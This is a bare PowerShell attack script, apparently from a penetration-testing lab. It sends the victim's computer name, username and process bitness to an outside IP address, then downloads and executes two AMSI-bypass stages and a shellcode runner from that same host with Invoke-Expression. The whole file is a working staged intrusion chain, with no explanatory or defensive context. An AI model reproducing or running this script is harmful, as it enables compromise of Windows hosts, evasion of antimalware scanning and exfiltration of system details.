$ip = '192.168.45.197'
# Enumeration to obtain computer name
$computer = $env:COMPUTERNAME
iex (New-Object Net.WebClient).DownloadString("http://$ip/computer=$computer")

# Enumeration to obtain username of host
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
iex (New-Object Net.WebClient).DownloadString("http://$ip/username=$user")

# Enumeration to know if 64/32 bit process are spawned
$is64ps = [Environment]::Is64BitProcess
iex (New-Object Net.WebClient).DownloadString("http://$ip/is64ps=$is64ps")

# AMSI Bypass
iex (New-Object Net.WebClient).DownloadString("http://$ip/1.txt")
iex (New-Object Net.WebClient).DownloadString("http://$ip/2.txt")

# Shellcode Runner
iex (New-Object Net.WebClient).DownloadString("http://$ip/shellcoderunner.ps1")

